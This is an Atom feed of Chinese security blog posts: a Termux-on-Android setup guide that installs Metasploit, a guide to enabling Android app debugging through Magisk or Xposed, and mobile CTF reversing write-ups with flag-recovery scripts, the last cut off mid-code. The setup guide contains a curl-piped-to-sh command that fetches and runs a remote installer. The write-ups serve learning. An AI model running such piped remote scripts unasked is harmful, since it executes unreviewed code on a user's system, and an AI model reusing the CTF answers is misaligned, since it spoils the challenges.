      <category term="macos" scheme="blog.b3ale.cn/tags/macos/"/>
    
  </entry>
  
  <entry>
    <title>使用Termux在Android上打造小型Linux服务器</title>
    <link href="blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>blog.b3ale.cn/2020/03/01/%E4%BD%BF%E7%94%A8Termux%E5%9C%A8Android%E4%B8%8A%E6%89%93%E9%80%A0%E5%B0%8F%E5%9E%8BLinux%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-03-01T02:50:30.000Z</published>
    <updated>2020-03-20T02:27:41.193Z</updated>
    
    <content type="html"><![CDATA[<p>使用 Termux 可以在 Android 上获得极佳的终端体验。</p><a id="more"></a><p>一些基础按键就不记录了。然后在 Termux 上的包管理工具有 pkg 和 apt，和 Debian 的基本一样，对我们来说已经很熟悉了。下面只是做一些简短的记录，用于备份。</p><h1 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h1><p>在 Termux 手机界面上可以完美实现 oh-my-zsh 的 agnoster 主题，在 Github 上已经有人实现了对应的安装脚本：</p><pre><code class="bash">sh -c &quot;$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)&quot;</code></pre><p>具体的安装过程也不列举了，装完后会让我们选主题和字体。成功之后根目录下会有一个 storage 目录，映射了手机系统上的一些文件夹，方便文件传输：</p><pre><code class="bash">$ ls -l storagetotal 24lrwxrwxrwx 1 u0_a146 u0_a146 26 Mar  1 12:45 dcim -&gt; /storage/emulated/0/DCIMlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 downloads -&gt; /storage/emulated/0/Downloadlrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 movies -&gt; /storage/emulated/0/Movieslrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 music -&gt; /storage/emulated/0/Musiclrwxrwxrwx 1 u0_a146 u0_a146 30 Mar  1 12:45 pictures -&gt; /storage/emulated/0/Pictureslrwxrwxrwx 1 u0_a146 u0_a146 22 Mar  1 12:45 shared -&gt; /storage/emulated/0</code></pre><p>同样，我们可以给 QQ 的文件传输整一个软链接：</p><pre><code class="bash">ln -s /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv QQ</code></pre><p>如此一来，传输文件就方便了很多：</p><pre><code class="bash">$ ls -al...lrwxrwxrwx 1 u0_a146 u0_a146   70 Mar  1 16:05 QQ -&gt; /data/data/com.termux/files/home/storage/shared/tencent/QQfile_recv...</code></pre><p>还能修改启动时的问候语：</p><pre><code class="bash">cp $PREFIX/etc/motd $PREFIX/etc/motd.bakvim $PREFIX/etc/motd</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/1.png" srcset="/img/loading.gif" alt></p><h1 id="Change-apt-sources"><a href="#Change-apt-sources" class="headerlink" title="Change apt-sources"></a>Change apt-sources</h1><p>给 apt 换个清华源：</p><pre><code class="bash">export EDITOR=viapt edit-sources</code></pre><p>修改为以下内容：</p><pre><code class="txt"># The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main</code></pre><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>接下来装个 SSH，用电脑连上更方便地进行后续的安装。</p><pre><code class="bash">apt updateapt upgradeapt install openssh</code></pre><p>将电脑的公钥 push 到手机上：</p><pre><code class="bash">adb push ~/.ssh/id_rsa.pub /sdcard/authorized_keys</code></pre><p>在 Termux 中把电脑公钥放在 <code>.ssh</code> 目录下，并设置 authorized_keys 文件为拥有者只读。最后启动服务：</p><pre><code class="bash">cd .sshmv /sdcard/authorized_keys .chmod 400 authorized_keyssshd</code></pre><p>在电脑上转发 adb 端口并连接：</p><pre><code class="bash">adb forward tcp:8022 tcp:8022ssh localhost -p 8022</code></pre><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>Python 必不可少。默认 Python 指 Python3，Python2 指 Python2：</p><pre><code class="bash">apt install python2apt install python # python3</code></pre><h1 id="IPython"><a href="#IPython" class="headerlink" title="IPython"></a>IPython</h1><p>IPython 的安装必须有 clang 的依赖，否则会报错：</p><pre><code class="bash">apt install clangpip install ipythonpip3.6 install ipython</code></pre><h1 id="tsu"><a href="#tsu" class="headerlink" title="tsu"></a>tsu</h1><p>用 tsu 替代 su 可以完美实现 root 转换：</p><pre><code class="bash">apt install tsu</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/2.png" srcset="/img/loading.gif" alt></p><h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>需要联（ke）网（xue）下载：</p><pre><code class="bash">apt install unstable-repoapt install metasploit</code></pre><p>输入 msfconsole 可以查看效果：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/3.png" srcset="/img/loading.gif" alt></p><p>这个版本也已经有 CVE-2019-0708 的 EXP 了：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/4.png" srcset="/img/loading.gif" alt></p><h1 id="Termux-API"><a href="#Termux-API" class="headerlink" title="Termux-API"></a>Termux-API</h1><p>其它很多软件像是 Nmap、SQLMap 等等，还有 Github 上的项目都基本和 Linux 中一模一样，可以用 apt 还有 pip 等管理器进行安装。下面记录一下 Termux-API 这一工具。首先要安装一下 <a href="https://play.google.com/store/apps/details?id=com.termux.api" target="_blank" rel="noopener">Termux:API</a> 这一 APP，然后用 apt 安装命令行：</p><pre><code class="bash">apt install termux-api</code></pre><p>获取电池信息：</p><pre><code class="bash">$ termux-battery-status{  &quot;health&quot;: &quot;GOOD&quot;,  &quot;percentage&quot;: 100,  &quot;plugged&quot;: &quot;PLUGGED_USB&quot;,  &quot;status&quot;: &quot;FULL&quot;,  &quot;temperature&quot;: 22.700000762939453,  &quot;current&quot;: -38757}</code></pre><p>获取相机信息：</p><pre><code class="bash">$ termux-camera-info</code></pre><p>获取与设置剪切板：</p><pre><code class="bash">$ termux-clipboard-set thisisassassinq$ termux-clipboard-getthisisassassinq</code></pre><p>获取通讯录列表：</p><pre><code class="bash">$ termux-contact-list</code></pre><p>拨打电话：</p><pre><code class="bash">$ termux-telephony-call 10001</code></pre><p>获取当前 Wi-Fi 连接信息：</p><pre><code class="bash">$ termux-wifi-connectioninfo{  &quot;bssid&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;frequency_mhz&quot;: 2412,  &quot;ip&quot;: &quot;192.168.101.68&quot;,  &quot;link_speed_mbps&quot;: 144,  &quot;mac_address&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;network_id&quot;: 0,  &quot;rssi&quot;: -53,  &quot;ssid&quot;: &quot;&lt;unknown ssid&gt;&quot;,  &quot;ssid_hidden&quot;: true,  &quot;supplicant_state&quot;: &quot;COMPLETED&quot;}</code></pre><p>获取最近一次 Wi-Fi 扫描信息：</p><pre><code class="bash">$ termux-wifi-scaninfo</code></pre><h1 id="nyancat"><a href="#nyancat" class="headerlink" title="nyancat"></a>nyancat</h1><p>彩虹猫是在 2011 年 4 月上传在 YouTube 的视频，并且迅速爆红于网络，并在 2011 年 YouTube 浏览量最高的视频中排名第五。这个视频内容为一只卡通的猫咪飞翔在宇宙中，身后拖出一条彩虹，并且配上了 UTAU 虚拟歌手桃音モモ所演唱的背景音乐。终端版本下载：</p><pre><code class="bash">apt install nyancat</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/5.png" srcset="/img/loading.gif" alt></p><h1 id="终端二维码"><a href="#终端二维码" class="headerlink" title="终端二维码"></a>终端二维码</h1><p>生成终端二维码（字体没选好，效果不太好）：</p><pre><code class="bash">echo &quot;https://qianfei11.github.io&quot; | curl -F-=\&lt;- qrenco.de</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/6.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://mushuichuan.com/2017/12/10/termux/" target="_blank" rel="noopener">https://mushuichuan.com/2017/12/10/termux/</a><br><a href="http://blackwolfsec.cc/2016/12/10/termux/" target="_blank" rel="noopener">http://blackwolfsec.cc/2016/12/10/termux/</a><br><a href="https://www.sqlsec.com/2018/05/termux.html" target="_blank" rel="noopener">https://www.sqlsec.com/2018/05/termux.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 Termux 可以在 Android 上获得极佳的终端体验。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>不同版本Android动态调试前打开调试开关简述</title>
    <link href="blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/"/>
    <id>blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/</id>
    <published>2020-02-29T02:13:37.000Z</published>
    <updated>2020-03-25T13:00:13.401Z</updated>
    
    <content type="html"><![CDATA[<p>手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>众所周知，最常规的方法就是在 AndroidManifest.xml 中的 application 标签中添加 <code>android:debuggable=&quot;true&quot;</code> 字段，然后再回编译、签名、安装、然后进行动态调试。但这种方法实在太麻烦了。</p><p>网上还有另外一种修改 Android prop 的工具 <a href="https://github.com/wpvsyou/mprop" target="_blank" rel="noopener">mprop</a>，用来修改 <code>default.prop</code> 中的 <code>ro.debuggable</code> 字段为 1（默认为 0）。因为 Android 系统初始化时，init 进程会解析系统属性文件，然后将其保存到内存中去，以便给所有应用提供服务（这种方法可以直接调试所有应用），所以在 init 进程的内存块中是存在这些属性的。在修改完成后要重启 adbd 进程，但这种方法的缺点是在每次开关机后需要重新修改。</p><p>最好的方法是能够直接安装一个程序，能够直接开启所有程序的调试，并且在开关机后也不需要重新设置。</p><h1 id="Android-4"><a href="#Android-4" class="headerlink" title="Android 4"></a>Android 4</h1><p>设备：Nexus 5</p><p>开启动态调试的要求是已 root，并且安装了 Xposed 框架。</p><h2 id="BDOpener"><a href="#BDOpener" class="headerlink" title="BDOpener"></a>BDOpener</h2><p><a href="https://github.com/riusksk/BDOpener" target="_blank" rel="noopener">BDOpener 下载链接</a></p><p>这里使用的是 BDOpener，这是一款 Xposed 的模块，用于修改程序的 debugable 选项，同时也支持开启备份选项，方便数据转移。只需要安装程序后，启用并重启手机，就能调试，可以用 monitor 来查看效果。</p><p><img src="/pics/不同版本Android动态调试前打开调试开关简述/1.png" srcset="/img/loading.gif" alt></p><h1 id="Android-9"><a href="#Android-9" class="headerlink" title="Android 9"></a>Android 9</h1><p>设备：Pixel XL</p><p>开启动态调试的要求是安装了 Magisk 框架（安装后默认 root）。因为 Xposed 的作者在 Android 6 后没有再更新，后来 Android 7 只出了非官方版本，尝试采用了 Magisk+Taichi 的方式来使用上面的 Xposed 模块，但安装了之后发现 Android UI 会在开机之后崩溃，所以尝试了另外一种方法。</p><h2 id="MagiskHidePropsConf"><a href="#MagiskHidePropsConf" class="headerlink" title="MagiskHidePropsConf"></a><a href="https://forum.xda-developers.com/apps/magisk/module-magiskhide-props-config-t3789228" target="_blank" rel="noopener">MagiskHidePropsConf</a></h2><p><a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf" target="_blank" rel="noopener">MagiskHidePropsConf 下载链接</a></p><p><a href="https://github.com/osm0sis/android-busybox-ndk" target="_blank" rel="noopener">Busybox 下载链接</a></p><p>MagiskHidePropsConf 是 Magisk 下的一个模块，可以用来修改系统中内存里的 props 值，并且永久生效，那么就可以用来修改 <code>ro.debuggable</code> 字段了。同时要求安装 Busybox for Android NDK 才能运行。操作如下：</p><pre><code class="sh">marlin:/ # propsLoading... Please wait.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Updating fingerprints list=====================================Checking connection.No connection.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Select an option below.=====================================1 - Edit device fingerprint2 - Device simulation (disabled)3 - Edit MagiskHide props4 - Add/edit custom props5 - Delete prop values6 - Script settings7 - Collect logsr - Reset all options/settingsb - Reboot devicee - ExitSee the module readme or thesupport thread @ XDA for details.Enter your desired option: 3MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== MagiskHide props (active) Select an option below:=====================================Change the sensitive props set by MagiskHide.1 - ro.debuggable2 - ro.secure3 - ro.build.type4 - ro.build.tags5 - ro.build.selinuxa - Change all propsb - Go back to main menue - ExitPick several options at once byseparating inputs with a comma.Example: 1,5,6See the module readme or thesupport thread @ XDA for details.Enter your desired option: 1MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== ro.debuggable=====================================Currently set to 0.You currently have the safe value set.Are you sure you want to change it to 1?Enter y(es), n(o) or e(xit): yMagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Reboot - ro.debuggable=====================================Reboot for changes to take effect.Do you want to reboot now (y/n)?Enter y(es), n(o) or e(xit): yRebooting...</code></pre><p>重启后也可以动态调了，同样可以用 monitor 来验证有没有成功。</p><h2 id="Magisk-命令"><a href="#Magisk-命令" class="headerlink" title="Magisk 命令"></a>Magisk 命令</h2><p>使用 Magisk 的命令也可以实现：</p><pre><code class="bash">magisk resetprop ro.debuggable 1stop; start; # 必须用这种方式重启</code></pre><p>在调试的过程中发现在 Pixel 下如果开了调试会出现开发者选项无法打开的问题，暂时没有解决方法。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</a><br><a href="https://bbs.pediy.com/thread-248322.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248322.htm</a><br><a href="https://www.renyiwei.com/archives/1704.html" target="_blank" rel="noopener">https://www.renyiwei.com/archives/1704.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-MOBILE-新手练习区</title>
    <link href="blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-02-20T11:51:47.000Z</published>
    <updated>2020-03-19T15:57:34.426Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新。</p><a id="more"></a><h1 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h1><p>将 apk 拖入 jadx 进行反编译，查看入口点 MainActivity 代码：</p><pre><code class="java">package com.example.yaphetshan.tencentgreat;import android.content.pm.PackageInfo;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    Button btn;    public final String pName = BuildConfig.APPLICATION_ID;    EditText text;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.btn = (Button) findViewById(R.id.checBtn);        this.text = (EditText) findViewById(R.id.input);        this.btn.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                try {                    String inputString = MainActivity.this.text.getText().toString();                    PackageInfo pinfo = MainActivity.this.getPackageManager().getPackageInfo(BuildConfig.APPLICATION_ID, AccessibilityNodeInfoCompat.ACTION_COPY);                    String versionCode = pinfo.versionName; // 获取包信息中的versionName                    int versionName = pinfo.versionCode; // 获取包信息中的versionCode                    int i = 0;                    while (i &lt; inputString.length() &amp;&amp; i &lt; versionCode.length()) {                        if (inputString.charAt(i) != (versionCode.charAt(i) ^ versionName)) { // 将versionCode中的每一字节和versionName异或并和输入比较                            Toast.makeText(MainActivity.this, &quot;\u518d\u63a5\u518d\u5389\uff0c\u52a0\u6cb9~&quot;, 1).show(); // 再接再厉，加油~                            return;                        }                        i++;                    }                    if (inputString.length() == versionCode.length()) { // 判断输入的长度和versionCode是否相同                        Toast.makeText(MainActivity.this, &quot;\u606d\u559c\u5f00\u542f\u95ef\u5173\u4e4b\u95e8\uff01&quot;, 1).show(); // 恭喜开启闯关之门！                        return;                    }                } catch (NameNotFoundException e) {                }                Toast.makeText(MainActivity.this, &quot;\u5e74\u8f7b\u4eba\u4e0d\u8981\u800d\u5c0f\u806a\u660e\u5662&quot;, 1).show(); // 年轻人不要耍小聪明噢            }        });    }}</code></pre><p>代码中可以判断出是将 versionCode 和 versionName 进行异或然后和输入比较，具体信息可以在 AndroidManifest.xml 中找到：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;15&quot; android:versionName=&quot;X&lt;cP[?PHNB&lt;P?aj&quot; package=&quot;com.example.yaphetshan.tencentgreat&quot; platformBuildVersionCode=&quot;25&quot; platformBuildVersionName=&quot;7.1.1&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;25&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;meta-data android:name=&quot;android.support.VERSION&quot; android:value=&quot;25.3.0&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;&gt;        &lt;activity android:name=&quot;com.example.yaphetshan.tencentgreat.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>编写脚本来得到 flag：</p><pre><code class="python">#!/usr/bin/env pythonversionCode = 15versionName = &quot;X&lt;cP[?PHNB&lt;P?aj&quot;flag = &#39;&#39;for c in versionName:    flag += chr(ord(c) ^ versionCode)print flag# W3l_T0_GAM3_0ne</code></pre><h1 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h1><p>先使用 jadx 反编译，查看入口点的代码，在两个输入框中输入字符串后会去调用 SecondActivity：</p><pre><code class="java">package com.tencent.testvuln;import android.annotation.SuppressLint;import android.app.Activity;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.os.Handler;import android.support.v4.BuildConfig;import android.util.Log;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import com.tencent.testvuln.c.SignatureTool;@SuppressLint({&quot;ShowToast&quot;})public class MainActivity extends Activity implements OnClickListener {    private Button a;    private Handler b = null;    private EditText c;    private EditText d;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main);        this.a = (Button) findViewById(R.id.button1);        this.a.setOnClickListener(this);        this.c = (EditText) findViewById(R.id.editText1);        this.d = (EditText) findViewById(R.id.editText2);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putLong(&quot;ili&quot;, System.currentTimeMillis());        edit.commit();        Log.d(&quot;hashcode&quot;, SignatureTool.getSignature(this) + BuildConfig.VERSION_NAME);    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }    public void onClick(View view) {        switch (view.getId()) {            case R.id.button1:                if (this.c.getText().length() == 0 || this.d.getText().length() == 0) {                    Toast.makeText(this, &quot;\u4e0d\u80fd\u4e3a\u7a7a&quot;, 1).show(); // 不能为空                    return;                }                String obj = this.c.getText().toString(); // 获取第一个输入框中的字符串                String obj2 = this.d.getText().toString(); // 获取第二个输入框中的字符串                Log.e(&quot;test&quot;, obj + &quot; test2 = &quot; + obj2);                Intent intent = new Intent(this, SecondActivity.class); // 设置Intent跳转到SecondActivity                intent.putExtra(&quot;ili&quot;, obj); // 设置变量ili的值为obj的值                intent.putExtra(&quot;lil&quot;, obj2); // 设置变量lil的值为obj2的值                startActivity(intent); // 调用SecondActivity                return;            default:                return;        }    }}</code></pre><p>接下来看看 SecondActivity，将输入的字符串拼接起来，经过 Encryto.doRawData 的操作后和一串 base64 进行比较：</p><pre><code class="java">package com.tencent.testvuln;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.widget.Toast;import com.tencent.testvuln.c.Encryto;public class SecondActivity extends a {    private BroadcastReceiver c = new BroadcastReceiver(this) {        final /* synthetic */ SecondActivity a;        {            this.a = r1;        }        public void onReceive(Context context, Intent intent) {            Toast.makeText(context, &quot;myReceiver receive&quot;, 0).show();            if (!context.getPackageName().equals(intent.getAction())) {            }        }    };    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main2);        Intent intent = getIntent();        String stringExtra = intent.getStringExtra(&quot;ili&quot;); // obj        String stringExtra2 = intent.getStringExtra(&quot;lil&quot;); // obj2        if (Encryto.doRawData(this, stringExtra + stringExtra2).equals(&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;)) { // 判断obj+obj2经过Encryto.doRawData后是否等于指定字符串            intent.setAction(&quot;android.test.action.MoniterInstallService&quot;);            intent.setClass(this, MoniterInstallService.class);            intent.putExtra(&quot;company&quot;, &quot;tencent&quot;);            intent.putExtra(&quot;name&quot;, &quot;hacker&quot;);            intent.putExtra(&quot;age&quot;, 18);            startActivity(intent);            startService(intent);        }        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;ilil&quot;, stringExtra);        edit.putString(&quot;lili&quot;, stringExtra2);        edit.commit();    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }}</code></pre><p>然后我找到了 Encryto.doRawData 函数的位置。可以看到这里的所有函数都是在 Native 层实现的：</p><pre><code class="java">package com.tencent.testvuln.c;public class Encryto {    public static native int checkSignature(Object obj);    public static native String decode(Object obj, String str);    public static native String doRawData(Object obj, String str);    public static native String encode(Object obj, String str);    public native String HelloLoad();    static {        System.loadLibrary(&quot;JNIEncrypt&quot;);    }}</code></pre><p>用 IDA 打开 libJNIEncrypt.so，然后定位到 JNI_OnLoad，并找到被动态注册的函数：</p><pre><code>.data:00006008 off_6008        DCD aChecksignature_0   ; DATA XREF: register_ndk_load+22↑o.data:00006008                                         ; .text:off_221C↑o.data:00006008                                         ; &quot;checkSignature&quot;.data:0000600C                 DCD aLjavaLangObjec     ; &quot;(Ljava/lang/Object;)I&quot;.data:00006010                 DCD check+1.data:00006014                 DCD aDecode_0           ; &quot;decode&quot;.data:00006018                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:0000601C                 DCD decode+1.data:00006020                 DCD aEncode_0           ; &quot;encode&quot;.data:00006024                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006028                 DCD encode+1.data:0000602C                 DCD aDorawdata_0        ; &quot;doRawData&quot;.data:00006030                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006034                 DCD doRawData+1.data:00006034 ; .data         ends</code></pre><p>看一下其中的 doRawData 函数，发现其中调用了一个 j_AES_128_ECB_PKCS5Padding_Encrypt 函数，可以大概推断出经过了 AES-128 的加密，且加密模式用了 ECB，Padding 用了 PKCS5：</p><pre><code class="cpp">int __fastcall doRawData(_JNIEnv *env, int a2, int a3, char *string){  _JNIEnv *v4; // r4  char *v5; // r9  const char *utf_string; // r6  int ciphertext; // r8  int result; // r0  jstring (__cdecl *v9)(JNIEnv *, const jchar *, jsize); // r6  char *v10; // r5  size_t v11; // r2  int key; // [sp+0h] [bp-28h]  int v13; // [sp+18h] [bp-10h]  v4 = env;  v5 = string;  if ( j_checkSignature((int)env, a2, a3) == 1    &amp;&amp; (strcpy((char *)&amp;key, &quot;thisisatestkey==&quot;),        utf_string = (const char *)((int (__fastcall *)(_JNIEnv *, char *, _DWORD))v4-&gt;functions-&gt;GetStringUTFChars)(                                     v4,                                     v5,                                     0),        ciphertext = j_AES_128_ECB_PKCS5Padding_Encrypt(utf_string, (int)&amp;key),        ((void (__fastcall *)(_JNIEnv *, char *, const char *))v4-&gt;functions-&gt;ReleaseStringUTFChars)(v4, v5, utf_string),        result = ((int (__fastcall *)(_JNIEnv *, int))v4-&gt;functions-&gt;NewStringUTF)(v4, ciphertext),        _stack_chk_guard == v13) )  {    return result;  }  do  {    v9 = v4-&gt;functions-&gt;NewString;    v10 = UNSIGNATURE[0];    v11 = strlen(UNSIGNATURE[0]);  }  while ( _stack_chk_guard != v13 );  result = ((int (__fastcall *)(_JNIEnv *, char *, size_t))v9)(v4, v10, v11);  return result;}</code></pre><p>然后进去看到加密完成之后进行了 base64 加密在返回密文：</p><pre><code class="cpp">int __fastcall AES_128_ECB_PKCS5Padding_Encrypt(const char *a1, int a2){  int v2; // r9  const char *v3; // r10  signed int v4; // r0  signed int v5; // r5  _BYTE *v6; // r11  signed int v7; // r0  const char *v8; // r1  signed int v9; // r8  char *v10; // r10  int v11; // r5  _BYTE *v12; // r0  signed int v13; // r2  char v14; // r6  int v15; // r6  int v16; // r4  int v17; // r5  v2 = a2;  v3 = a1;  v4 = strlen(a1);  v5 = v4;  if ( v4 &lt;= 15 )  {    v6 = malloc(0x10u);    v7 = 0;    do    {      v8 = &amp;byte_3BB0[16 - v5];      if ( v7 &lt; v5 )        v8 = &amp;v3[v7];      v6[v7++] = *v8;    }    while ( v7 != 16 );    v9 = 16;    v10 = (char *)malloc(0x10u);    v11 = 1;LABEL_18:    v15 = 0;    v16 = 0;    do    {      j_AES128_ECB_encrypt(&amp;v6[v15], v2, &amp;v10[v15]);      ++v16;      v15 += 16;    }    while ( v16 &lt; v11 );    goto LABEL_22;  }  v9 = (v4 + 16) &amp; 0xFFFFFFF0;  v12 = malloc(v9);  v6 = v12;  if ( v9 &lt;= 0 )  {    v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);    goto LABEL_22;  }  v13 = 0;  do  {    if ( v13 &gt;= v5 )    {      if ( !(v5 &amp; 0xF) )      {        v12[v13] = 16;        goto LABEL_15;      }      v14 = byte_3BB0[v9 - v5];    }    else    {      v14 = v3[v13];    }    v12[v13] = v14;LABEL_15:    ++v13;  }  while ( v9 != v13 );  v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);  if ( v9 &gt;= 16 )  {    v11 = v9 / 16;    goto LABEL_18;  }LABEL_22:  v17 = j_b64_encode((int)v10, v9);  free(v6);  free(v10);  return v17;}</code></pre><p>用 Python 脚本解密得到明文：</p><pre><code class="python">#!/usr/bin/env pythonfrom Crypto.Cipher import AESkey = &#39;thisisatestkey==&#39;aes = AES.new(key, AES.MODE_ECB)ciphertext = &#39;VEIzd/V2UPYNdn/bxH3Xig==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext)# aimagetencent</code></pre><p>尝试提交这串字符串提示错误，再尝试用这字符串登录也没得到什么结果，那么继续往下分析。发现其中调用了多次 Intent，还设置了 IntentFilter，看的眼花缭乱都没找到 flag 在哪里。再去尝试一下交叉引用，看看哪些类调用了 Encryto 类，发现了 FileDataActivity 类中调用了 decode 方法，在 IDA 中可以发现 decode 和 doRawData 的功能一模一样：</p><pre><code class="java">package com.tencent.testvuln;import android.os.Bundle;import android.widget.TextView;import com.tencent.testvuln.c.Encryto;public class FileDataActivity extends a {    private TextView c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main3);        this.c = (TextView) 